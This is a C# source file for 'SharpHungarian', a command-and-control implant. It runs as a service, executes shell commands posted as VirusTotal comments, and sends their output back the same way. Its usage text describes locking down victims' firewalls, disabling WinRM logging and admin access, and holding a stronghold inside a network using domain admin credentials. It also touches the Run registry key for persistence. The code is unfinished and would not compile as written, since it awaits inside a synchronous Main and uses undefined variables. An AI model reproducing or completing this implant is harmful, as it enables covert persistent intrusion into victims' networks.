using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace SharpHungarian
{
    class Program
    {
        static void Main(string[] args)
        {
            if (args.Length != 4 && args.Length != 2)
            {
                {
                    System.Console.WriteLine("\r\n\r\nSharpHungarian: This is a non-interactive command and control agent that runs as a service." +
                        "Using VIrusTotal as the outbound C2." +
                        "Upload a text file to VirusTotal, then take the sha1 hash." +
                        "The service will collect any comments left on the VirusTotal platform, execute them and post a comment back to VirusTotal with the command output" +
                        "Between each command run it will block the firewall so that only port 443 can be used both inbound and outbound into and inside the environment" +
                        "You will then have a single machine as a strong hold inside the network, with winrm logging disabled, internal network admin access disabled, and c2");
                    System.Console.WriteLine("Usage:");
                    System.Console.WriteLine("Make Your Fortress:   SharpHungarian.exe VirusTotalApi Sha1hash DAUSER DAPASSWORD");

                    System.Environment.Exit(1);
                }


                ////// TO DO: Implement C++ code to make the process protected with pplib (https://github.com/notscimmy/pplib)


                string Sha1hash = String.Empty;
                string VirusTotalApi = String.Empty;
                string DAUSER = String.Empty;
                string DAPASSWORD = String.Empty;


                VirusTotalApi = args[0];

                if (args.Length == 4)
                {
                    VirusTotalApi = args[0];
                    Sha1hash = args[1];
                    DAUSER = args[2];
                    DAPASSWORD = args[3];

                }
                else
                {
                    System.Environment.Exit(1);
                }

                RegistryKey reg_key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true);


                /// TODO
                Firewall_Enable kf = new Firewall_Enable();
                kf.Go_Dark();


                /// TODO
                Firewall_443_Open sd = new Firewall_443_Open();
                sd.Open_Firwall();


                //// Start C2 With A Whoami command
                string commproc = "cmd.exe";

                /// needs to be completed 
                C2connectivitiy n = await C2connectivitiy();
                n.C2_command_to_run(VirusTotalApi, Sha1hash, commproc, "whoami");

                Console.WriteLine(output);


            }
        }
    }
}
